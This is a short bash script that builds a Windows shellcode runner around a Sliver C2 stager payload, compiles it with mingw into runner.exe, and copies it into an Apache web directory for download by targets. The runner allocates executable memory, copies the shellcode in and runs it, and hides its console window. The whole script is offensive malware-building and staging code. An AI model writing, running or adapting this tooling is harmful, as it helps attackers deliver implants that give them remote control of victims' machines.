
# THIS SCRIPT CREATED AN EXE FILE FROM SLIVER'S STAGER PAYLOAD
# THEN MOVE IT TO /var/www/html/stagers

#sliver "generate stager" command stored payload at --save /tmp/payload.c
payload_file="/tmp/payload.c"

c_script_file="/tmp/runner.c"
exe_script_file="/tmp/runner.exe"
# path of runner.exe in apache
target_directory="/var/www/html/stagers"

# Check if the file exists
[ -e "$payload_file" ] || { echo "File '$payload_file' does not exist."; exit 1; }

# Read the contents of the file into a variable 'file_contents'
payload=$(cat "$payload_file")

#Create c code
echo "#include \"windows.h\"" > $c_script_file
echo "int main()" >> $c_script_file
echo "{" >> $c_script_file
echo "$payload" >> $c_script_file
echo "FreeConsole();" >> $c_script_file
echo "void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" >> $c_script_file
echo "memcpy(exec, buf, sizeof buf);" >> $c_script_file
echo "((void(*)())exec)();" >> $c_script_file
echo "return 0;" >> $c_script_file
echo "}" >> $c_script_file
echo "Runner.c file created successfully."

# Compile runner.c to runner.exe using x86_64-w64-mingw32-gcc in the background
x86_64-w64-mingw32-gcc -o "$exe_script_file" "$c_script_file" &

echo "Compilation successful. Executable $exe_script_file created."

if [ ! -d "$target_directory" ]; then
    mkdir -p "$target_directory"
fi
# Move runner.exe to /var/www/html/stagers
sleep 1
cp $exe_script_file $target_directory
echo "$exe_script_file moved to $target_directory."

chmod 777 "$target_directory/runner.exe"